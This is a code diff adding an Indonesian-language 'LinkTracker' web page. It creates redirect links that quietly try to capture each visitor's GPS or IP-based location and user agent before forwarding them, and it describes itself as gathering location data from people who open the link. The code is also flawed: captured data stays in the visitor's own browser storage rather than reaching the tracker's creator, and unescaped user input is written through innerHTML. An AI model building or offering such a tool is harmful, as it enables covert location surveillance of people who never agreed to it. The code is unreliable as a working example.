@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinkTracker - Lacak Lokasi Pengunjung</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f7fa;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            text-align: center;
+            padding: 20px 0;
+            margin-bottom: 30px;
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+        
+        .description {
+            font-size: 1.1rem;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+        }
+        
+        h2 {
+            color: #2c3e50;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #f1f1f1;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #2c3e50;
+        }
+        
+        input[type="text"], input[type="url"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+        
+        input[type="text"]:focus, input[type="url"]:focus {
+            border-color: #3498db;
+            outline: none;
+        }
+        
+        button {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: background 0.3s;
+        }
+        
+        button:hover {
+            background: #2980b9;
+        }
+        
+        .result {
+            display: none;
+            margin-top: 20px;
+            padding: 15px;
+            background: #e8f4fc;
+            border-radius: 6px;
+            border-left: 4px solid #3498db;
+        }
+        
+        .tracking-link {
+            word-break: break-all;
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 10px;
+        }
+        
+        .location-data {
+            margin-top: 20px;
+        }
+        
+        .location-item {
+            margin-bottom: 10px;
+            padding: 10px;
+            background: #f8f9fa;
+            border-radius: 6px;
+        }
+        
+        .location-info {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 5px;
+        }
+        
+        .location-map {
+            height: 200px;
+            background: #eee;
+            border-radius: 6px;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #777;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            color: #7f8c8d;
+            font-size: 0.9rem;
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 20px;
+            background: #2ecc71;
+            color: white;
+            border-radius: 5px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            display: none;
+            z-index: 1000;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .card {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>LinkTracker</h1>
+            <p class="description">Buat tautan pelacakan untuk mendapatkan informasi lokasi dari orang yang membukanya</p>
+        </header>
+        
+        <div class="card">
+            <h2>Buat Tautan Pelacakan</h2>
+            <div class="input-group">
+                <label for="link-name">Nama Tautan (Opsional)</label>
+                <input type="text" id="link-name" placeholder="Misal: Tautan untuk Customer A">
+            </div>
+            <div class="input-group">
+                <label for="destination-url">URL Tujuan</label>
+                <input type="url" id="destination-url" placeholder="https://example.com" required>
+            </div>
+            <button id="generate-btn">Buat Tautan Pelacakan</button>
+            
+            <div class="result" id="link-result">
+                <p class="tracking-link" id="generated-link"></p>
+                <button id="copy-btn">Salin Tautan</button>
+            </div>
+        </div>
+        
+        <div class="card">
+            <h2>Data Lokasi yang Terkumpul</h2>
+            <div id="location-data" class="location-data">
+                <p id="no-data">Belum ada data lokasi. Bagikan tautan pelacakan dan data akan muncul di sini.</p>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>© 2023 LinkTracker - Hak Cipta Dilindungi</p>
+        </div>
+    </div>
+    
+    <div class="notification" id="notification">Tautan berhasil disalin!</div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const generateBtn = document.getElementById('generate-btn');
+            const copyBtn = document.getElementById('copy-btn');
+            const linkResult = document.getElementById('link-result');
+            const generatedLink = document.getElementById('generated-link');
+            const locationData = document.getElementById('location-data');
+            const noData = document.getElementById('no-data');
+            const notification = document.getElementById('notification');
+            
+            // Load existing data from localStorage
+            loadLocationData();
+            
+            generateBtn.addEventListener('click', function() {
+                const destinationUrl = document.getElementById('destination-url').value;
+                const linkName = document.getElementById('link-name').value || 'Tautan tanpa nama';
+                
+                if (!destinationUrl) {
+                    alert('Silakan masukkan URL tujuan');
+                    return;
+                }
+                
+                // Generate unique ID for this tracking link
+                const linkId = 'link-' + Date.now();
+                
+                // Create tracking link
+                const trackingLink = window.location.href + '?track=' + linkId;
+                
+                // Save link info to localStorage
+                const linkInfo = {
+                    id: linkId,
+                    name: linkName,
+                    destination: destinationUrl,
+                    createdAt: new Date().toISOString(),
+                    clicks: []
+                };
+                
+                saveLinkInfo(linkInfo);
+                
+                // Display the generated link
+                generatedLink.textContent = trackingLink;
+                linkResult.style.display = 'block';
+                
+                // Scroll to the result
+                linkResult.scrollIntoView({ behavior: 'smooth' });
+            });
+            
+            copyBtn.addEventListener('click', function() {
+                const tempTextArea = document.createElement('textarea');
+                tempTextArea.value = generatedLink.textContent;
+                document.body.appendChild(tempTextArea);
+                tempTextArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(tempTextArea);
+                
+                // Show notification
+                notification.style.display = 'block';
+                setTimeout(function() {
+                    notification.style.display = 'none';
+                }, 2000);
+            });
+            
+            // Check if this page is a tracking link redirect
+            const urlParams = new URLSearchParams(window.location.search);
+            const trackParam = urlParams.get('track');
+            
+            if (trackParam) {
+                // This is a tracking link click, capture data and redirect
+                captureAndRedirect(trackParam);
+            }
+            
+            function captureAndRedirect(linkId) {
+                // Get link info from localStorage
+                const linkInfo = getLinkInfo(linkId);
+                
+                if (linkInfo) {
+                    // Capture location data
+                    captureLocationData()
+                        .then(location => {
+                            // Add click data to link info
+                            linkInfo.clicks.push({
+                                timestamp: new Date().toISOString(),
+                                location: location,
+                                userAgent: navigator.userAgent
+                            });
+                            
+                            // Save updated link info
+                            saveLinkInfo(linkInfo);
+                            
+                            // Redirect to destination URL
+                            window.location.href = linkInfo.destination;
+                        })
+                        .catch(error => {
+                            console.error('Error capturing location:', error);
+                            // Redirect even if location capture fails
+                            window.location.href = linkInfo.destination;
+                        });
+                } else {
+                    // Link not found, redirect to home page
+                    window.location.href = window.location.origin;
+                }
+            }
+            
+            function captureLocationData() {
+                return new Promise((resolve, reject) => {
+                    if (!navigator.geolocation) {
+                        reject('Geolocation tidak didukung oleh browser ini');
+                        return;
+                    }
+                    
+                    // Try to get precise location first
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            const location = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy,
+                                timestamp: new Date().toISOString(),
+                                method: 'GPS'
+                            };
+                            resolve(location);
+                        },
+                        error => {
+                            // If precise location fails, try IP-based location
+                            getApproximateLocation()
+                                .then(location => resolve(location))
+                                .catch(err => reject(err));
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 5000,
+                            maximumAge: 0
+                        }
+                    );
+                });
+            }
+            
+            function getApproximateLocation() {
+                return new Promise((resolve, reject) => {
+                    fetch('https://ipapi.co/json/')
+                        .then(response => response.json())
+                        .then(data => {
+                            const location = {
+                                latitude: data.latitude,
+                                longitude: data.longitude,
+                                accuracy: 50000, // Approximate accuracy for IP-based location
+                                city: data.city,
+                                region: data.region,
+                                country: data.country_name,
+                                timestamp: new Date().toISOString(),
+                                method: 'IP'
+                            };
+                            resolve(location);
+                        })
+                        .catch(error => {
+                            reject('Tidak dapat mendapatkan lokasi: ' + error);
+                        });
+                });
+            }
+            
+            function saveLinkInfo(linkInfo) {
+                let allLinks = JSON.parse(localStorage.getItem('trackingLinks') || '{}');
+                allLinks[linkInfo.id] = linkInfo;
+                localStorage.setItem('trackingLinks', JSON.stringify(allLinks));
+                
+                // Update the UI
+                loadLocationData();
+            }
+            
+            function getLinkInfo(linkId) {
+                const allLinks = JSON.parse(localStorage.getItem('trackingLinks') || '{}');
+                return allLinks[linkId];
+            }
+            
+            function loadLocationData() {
+                const allLinks = JSON.parse(localStorage.getItem('trackingLinks') || '{}');
+                
+                if (Object.keys(allLinks).length === 0) {
+                    noData.style.display = 'block';
+                    return;
+                }
+                
+                noData.style.display = 'none';
+                locationData.innerHTML = '';
+                
+                // Display all tracking data
+                for (const linkId in allLinks) {
+                    const link = allLinks[linkId];
+                    const linkElement = document.createElement('div');
+                    linkElement.classList.add('location-item');
+                    
+                    let linkHTML = `
+                        <h3>${link.name}</h3>
+                        <p><strong>URL Tujuan:</strong> ${link.destination}</p>
+                        <p><strong>Dibuat pada:</strong> ${new Date(link.createdAt).toLocaleString('id-ID')}</p>
+                        <p><strong>Jumlah Klik:</strong> ${link.clicks.length}</p>
+                    `;
+                    
+                    if (link.clicks.length > 0) {
+                        linkHTML += `<div class="clicks-container">`;
+                        
+                        link.clicks.forEach((click, index) => {
+                            let locationText = 'Lokasi tidak tersedia';
+                            
+                            if (click.location) {
+                                if (click.location.method === 'GPS') {
+                                    locationText = `
+                                        <strong>Lokasi:</strong> ${click.location.latitude.toFixed(6)}, ${click.location.longitude.toFixed(6)}
+                                        <br><strong>Akurasi:</strong> ±${Math.round(click.location.accuracy)} meter
+                                        <br><strong>Metode:</strong> ${click.location.method}
+                                    `;
+                                } else if (click.location.method === 'IP') {
+                                    locationText = `
+                                        <strong>Lokasi:</strong> ${click.location.city || 'Tidak diketahui'}, ${click.location.region || 'Tidak diketahui'}, ${click.location.country || 'Tidak diketahui'}
+                                        <br><strong>Metode:</strong> ${click.location.method}
+                                    `;
+                                }
+                            }
+                            
+                            linkHTML += `
+                                <div class="click-info">
+                                    <p><strong>Klik #${index + 1}:</strong> ${new Date(click.timestamp).toLocaleString('id-ID')}</p>
+                                    <p>${locationText}</p>
+                                    <div class="location-map">
+                                        ${click.location ? `
+                                            <iframe
+                                                width="100%"
+                                                height="100%"
+                                                frameborder="0"
+                                                style="border:0; border-radius: 6px;"
+                                                src="https://www.openstreetmap.org/export/embed.html?bbox=${click.location.longitude-0.02}%2C${click.location.latitude-0.02}%2C${click.location.longitude+0.02}%2C${click.location.latitude+0.02}&amp;layer=hot&amp;marker=${click.location.latitude}%2C${click.location.longitude}"
+                                                allowfullscreen>
+                                            </iframe>
+                                        ` : 'Peta tidak tersedia'}
+                                    </div>
+                                </div>
+                                <hr>
+                            `;
+                        });
+                        
+                        linkHTML += `</div>`;
+                    }
+                    
+                    linkElement.innerHTML = linkHTML;
+                    locationData.appendChild(linkElement);
+                }
+            }
+        });
+    </script>
+</body>
+</html>
